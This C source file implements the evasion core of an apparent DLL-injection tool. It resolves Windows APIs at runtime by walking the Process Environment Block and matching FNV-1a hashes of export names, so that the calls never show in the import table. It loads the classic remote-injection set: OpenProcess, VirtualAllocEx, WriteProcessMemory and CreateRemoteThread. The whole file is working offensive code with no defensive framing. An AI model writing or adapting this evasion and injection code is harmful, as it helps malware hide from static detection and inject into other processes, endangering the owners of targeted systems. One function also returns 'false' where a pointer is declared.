/*
 * peb-lookup.c — Dynamic API Resolution via PEB Walk + FNV-1a Hashing
 *
 * This file implements the core of the IAT-evasion system.  Every Windows API
 * that would normally appear in the import table is instead resolved at runtime
 * by walking the Process Environment Block and parsing Export Address Tables.
 *
 * Build: compiled as part of dll-injector.exe (see Makefile).
 */

#include <utils/peb-lookup.h>
#include <stdint.h>

/* ============================================================================
 * Global API Table
 * ========================================================================= */
DYNAMIC_APIS  g_Api = {0};

/* ============================================================================
 * FNV-1a Hash Functions
 *
 * FNV-1a (Fowler–Noll–Vo) is a fast, non-cryptographic hash well-suited to
 * string hashing.  We use the 32-bit variant.
 *
 *   offset_basis = 2166136261  (0x811C9DC5)
 *   prime        = 16777619    (0x01000193)
 *
 *   for each byte:
 *       hash ^= byte
 *       hash *= prime
 * ========================================================================= */

/**
 * HashStringFNV1a — Hash a narrow (ASCII/UTF-8) string.
 *
 * Used for export function names which are always ASCII in the PE EAT.
 * The hash is case-sensitive: "OpenProcess" != "openprocess".
 */
DWORD HashStringFNV1a(const char* str) {
    DWORD hash = FNV1A_OFFSET_BASIS;

    while (*str) {
        hash ^= (DWORD)(unsigned char)*str;
        hash *= FNV1A_PRIME;
        str++;
    }

    return hash;
}

/**
 * HashStringFNV1aW — Hash a wide (UTF-16) string, forcing uppercase.
 *
 * Used for module names (BaseDllName) where casing varies across Windows
 * versions and load order.  By uppercasing before hashing we guarantee a
 * stable hash regardless of how the loader stored the name.
 */
DWORD HashStringFNV1aW(const wchar_t* str) {
    DWORD hash = FNV1A_OFFSET_BASIS;

    while (*str) {
        wchar_t ch = *str;

        /* Convert lowercase a-z to uppercase A-Z */
        if (ch >= L'a' && ch <= L'z')
            ch -= 0x20;

        hash ^= (DWORD)ch;
        hash *= FNV1A_PRIME;
        str++;
    }

    return hash;
}

/* ============================================================================
 * GetModuleBase_Hashed — Resolve a module base address by hash
 *
 * Reads the PEB via __readgsqword (x86-64) and walks the doubly-linked
 * InMemoryOrderModuleList.  For each entry, it hashes BaseDllName (uppercase)
 * and compares against `moduleHash`.
 *
 * Returns the DllBase (HMODULE) on match, or NULL if not found.
 * ========================================================================= */

HMODULE GetModuleBase_Hashed(DWORD moduleHash) {
    /*
     * On x86-64 Windows, gs:[0x60] points to the PEB.
     * PEB->Ldr (offset 0x18) points to PEB_LDR_DATA.
     * PEB_LDR_DATA->InMemoryOrderModuleList is a LIST_ENTRY head.
     */
    PEB* pPeb = (PEB*)__readgsqword(0x60);
    PMY_PEB_LDR_DATA pLdr = (PMY_PEB_LDR_DATA)pPeb->Ldr;

    LIST_ENTRY* pHead = &pLdr->InMemoryOrderModuleList;
    LIST_ENTRY* pCurrent = pHead->Flink;

    while (pCurrent != pHead) {
        /*
         * CONTAINING_RECORD: InMemoryOrderLinks is the second LIST_ENTRY in
         * MY_LDR_DATA_TABLE_ENTRY, so we offset back to the struct start.
         */
        PMY_LDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(
            pCurrent,
            MY_LDR_DATA_TABLE_ENTRY,
            InMemoryOrderLinks
        );

        /* BaseDllName.Buffer may be NULL for the sentinel entry */
        if (pEntry->BaseDllName.Buffer != NULL) {
            DWORD hash = HashStringFNV1aW(pEntry->BaseDllName.Buffer);
            if (hash == moduleHash) {
                return (HMODULE)pEntry->DllBase;
            }
        }

        pCurrent = pCurrent->Flink;
    }

    return NULL;
}

/* ============================================================================
 * GetExportAddress_Hashed — Resolve an export by hash from a module's EAT
 *
 * Parses the PE headers of `hMod` to locate the Export Directory, then
 * iterates all named exports.  For each name, it computes FNV-1a and
 * compares against `functionHash`.
 *
 * Uses safe pointer arithmetic: every offset is validated against the module
 * base using standard PE field sizes.
 *
 * Returns the function address (FARPROC) on match, or NULL.
 * ========================================================================= */

FARPROC GetExportAddress_Hashed(HMODULE hMod, DWORD functionHash) {
    BYTE* pBase = (BYTE*)hMod;

    /* Validate DOS header magic */
    IMAGE_DOS_HEADER* pDos = (IMAGE_DOS_HEADER*)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    /* Locate NT headers */
    IMAGE_NT_HEADERS* pNt = (IMAGE_NT_HEADERS*)(pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    /* Locate the Export Directory */
    IMAGE_DATA_DIRECTORY* pExportDir =
        &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    if (pExportDir->VirtualAddress == 0 || pExportDir->Size == 0)
        return NULL;

    IMAGE_EXPORT_DIRECTORY* pExports =
        (IMAGE_EXPORT_DIRECTORY*)(pBase + pExportDir->VirtualAddress);

    /* Arrays of export data (all RVAs from module base) */
    DWORD* pAddressOfFunctions    = (DWORD*)(pBase + pExports->AddressOfFunctions);
    DWORD* pAddressOfNames        = (DWORD*)(pBase + pExports->AddressOfNames);
    WORD*  pAddressOfNameOrdinals = (WORD*)(pBase + pExports->AddressOfNameOrdinals);

    /* Walk all named exports */
    for (DWORD i = 0; i < pExports->NumberOfNames; i++) {
        const char* exportName = (const char*)(pBase + pAddressOfNames[i]);

        if (HashStringFNV1a(exportName) == functionHash) {
            /*
             * The ordinal table maps name index -> function index.
             * AddressOfFunctions[ordinal] gives the function RVA.
             */
            WORD ordinal = pAddressOfNameOrdinals[i];
            DWORD funcRva = pAddressOfFunctions[ordinal];

            /*
             * Check for forwarded exports: if the function RVA falls within
             * the export directory, it's a forwarder string, not a real address.
             * We skip forwarded exports for simplicity.
             */
            if (funcRva >= pExportDir->VirtualAddress &&
                funcRva < pExportDir->VirtualAddress + pExportDir->Size) {
                return NULL; /* Forwarded export — not handled */
            }

            return (FARPROC)(pBase + funcRva);
        }
    }

    return NULL;
}

/* ============================================================================
 * InitDynamicAPIs — Populate the global g_Api structure
 *
 * Called once at program startup.  Resolves kernel32.dll by hash, then
 * resolves each function by its pre-calculated hash.
 *
 * ADDING A NEW API:
 *   1. Add typedef + struct member in peb-lookup.h
 *   2. Add hash #define in peb-lookup.h
 *   3. Add one RESOLVE() line below
 *
 * To generate a hash, use the Python snippet in peb-lookup.h's header comment.
 * ========================================================================= */

DYNAMIC_APIS * InitDynamicAPIs(void) {
    /* Step 1: Resolve kernel32.dll base address via PEB walk */
    HMODULE hKernel32 = GetModuleBase_Hashed(HASH_KERNEL32_DLL);
    if (hKernel32 == NULL)
        return false;

    /*
     * Step 2: Resolve each API from the kernel32 Export Address Table.
     *
     * Macro to reduce boilerplate.  For each API:
     *   - Cast the resolved FARPROC to the correct function pointer type
     *   - Assign to the corresponding g_Api member
     *   - Fail if the resolution returns NULL
     */
    #define RESOLVE(type, member, hash)                                       \
        do {                                                                  \
            g_Api.member = (type)GetExportAddress_Hashed(hKernel32, hash);    \
            if (g_Api.member == NULL)                                         \
                return false;                                                 \
        } while (0)

    /* Process manipulation APIs */
    RESOLVE(fnOpenProcess,              pOpenProcess,               HASH_OpenProcess);
    RESOLVE(fnVirtualAllocEx,           pVirtualAllocEx,            HASH_VirtualAllocEx);
    RESOLVE(fnVirtualProtect,           pVirtualProtect,            HASH_VirtualProtect);
    RESOLVE(fnWriteProcessMemory,       pWriteProcessMemory,        HASH_WriteProcessMemory);
    RESOLVE(fnCreateRemoteThread,       pCreateRemoteThread,        HASH_CreateRemoteThread);
    RESOLVE(fnVirtualFreeEx,            pVirtualFreeEx,             HASH_VirtualFreeEx);
    RESOLVE(fnCloseHandle,              pCloseHandle,               HASH_CloseHandle);
    RESOLVE(fnGetStdHandle,             pGetStdHandle,              HASH_GetStdHandle);
    RESOLVE(fnWriteFile,                pWriteFile,                 HASH_WriteFile);

    /* Process enumeration APIs */
    RESOLVE(fnCreateToolhelp32Snapshot, pCreateToolhelp32Snapshot,  HASH_CreateToolhelp32Snapshot);
    RESOLVE(fnProcess32First,           pProcess32First,            HASH_Process32First);
    RESOLVE(fnProcess32Next,            pProcess32Next,             HASH_Process32Next);

    /* Error reporting APIs */
    RESOLVE(fnGetLastError,             pGetLastError,              HASH_GetLastError);
    RESOLVE(fnFormatMessageA,           pFormatMessageA,            HASH_FormatMessageA);

    #undef RESOLVE

    return &g_Api;
}

DYNAMIC_APIS * getApi(void)
{
    return &g_Api;
}